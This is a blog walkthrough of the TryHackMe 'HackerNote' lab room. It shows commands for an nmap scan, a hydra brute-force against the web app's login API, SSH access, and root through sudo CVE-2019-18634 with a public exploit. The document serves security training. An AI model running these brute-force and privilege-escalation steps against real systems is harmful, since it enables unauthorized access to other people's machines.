---
layout: post
title: HackerNote – Try Hack Me
subtitle: Walkthrough
tags: [webbapp]
---

HackerNote presents us with a simple web app where the login functionality can be exploited. We will take advantage of this and get full control of the machine.

Learning Objectives:

* Enumeration
* Username Bruteforcing
* Password Bruteforcing
* Priviledge Escalation

[Challenge](https://tryhackme.com/room/hackernote)  

## Task 1 -> Reconnaissance

Initiate the VPN connection and deploy the machine

Add the IP address of our machine to the /etc/hosts

~~~
echo 10.10.69.112 hackernote >> /etc/hosts
~~~

Nmap scan to discover what we are working with

~~~
nmap -A -T5 hackernote
~~~

![nmap](/img/2020-05-04-HackerNote/nmap.png)

## Task 2 -> Investigate

In this section you should explore the webapp capabilities from a new user point of view. 

* Create an account
* Log in
* See how the webapp responds to an invalid user/password

## Task 3 -> Exploit

Looking at the file 'login.js' we find the API endpoint 'api/user/login' this is where we will aim our bruteforce.  
I wrote this exploit using the challenge tips, you must provide the wordlist path in the first argument.


![exploit](/img/2020-05-04-HackerNote/exploit.png)

## Task 4 -> Attack Passwords

Once the utils are installed use the following command to merge the provided wordlists.

~~~
./combinator.bin colors.txt /numbers.txt > wordlist.txt
~~~

Start bruteforcing using hydra with this command

~~~
hydra -l james -P wordlist.txt hackernote http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
~~~


![hydra](/img/2020-05-04-HackerNote/hydra.png)

Now that we discovered both the username and the password we can log into the user account.  
From the notes get the user's ssh password

![sshPass](/img/2020-05-04-HackerNote/sshPass.png)

We now can log into the machine through ssh

~~~
ssh james@hackernote
~~~

![ssh](/img/2020-05-04-HackerNote/ssh.png)

## Task 5 -> Escalate

From a quick search with the words 'pwdfeedback' and 'CVE' we find 'CVE-2019-18634'

Download the CVE [exploit](https://github.com/saleemrashid/sudo-cve-2019-18634) and compile it with

~~~
make
~~~

SCP the binary into the machine

~~~
scp ./exploit james@hackernote:/home/james 
~~~

Simply run the exploit and get root.

![root](/img/2020-05-04-HackerNote/root.png)

Hope you enjoyed this machine.